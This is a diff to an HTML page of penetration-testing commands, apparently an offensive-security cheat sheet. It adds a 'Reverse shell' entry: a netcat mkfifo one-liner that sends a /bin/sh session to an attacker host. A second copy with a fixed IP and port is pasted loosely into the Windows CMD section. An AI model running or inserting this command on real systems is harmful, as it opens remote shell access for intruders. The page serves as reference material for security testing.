@@ -48,6 +48,7 @@ Topic contains:
       	<li> <a href='#n1.16'> Masscan </a>
         <li> <a href='#n1.17'> Meterpreter </a>
 	<li> <a href='#n1.18'> CMD (Windows)</a>
+        <li> <a href='#n1.19'> Reverse shell</a>
 		
 <h3 id='n1.1'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins>Remote Desktop Protocol (RDP): </ins></h3>
   <pre><code> xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;TARGET_IP> /u:&lt;USERNAME> /p:&lt;'PASSWORD'> </code></pre>
@@ -451,7 +452,14 @@ Need to install script. Thanks for that, <a href='https://github.com/scipag'> Sc
 			<li> dir /b /s "folder and search term" - searches for files based on a keyword
 			<li> mkdir - creates a new folder
 		</ul>
+
+  	rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
  </ol>
+
+<h3 id='n1.19'> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <ins> Reverse Shell </ins></h3>
+	<ol>
+		<li> <pre><code> rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;ATTACKER_IP> &lt;ATTACKER_PORT> >/tmp/f </code></pre>
+  	</ol>
 
 <h3 align='right'><a href='#start'> <-- Back </a></h3>
    
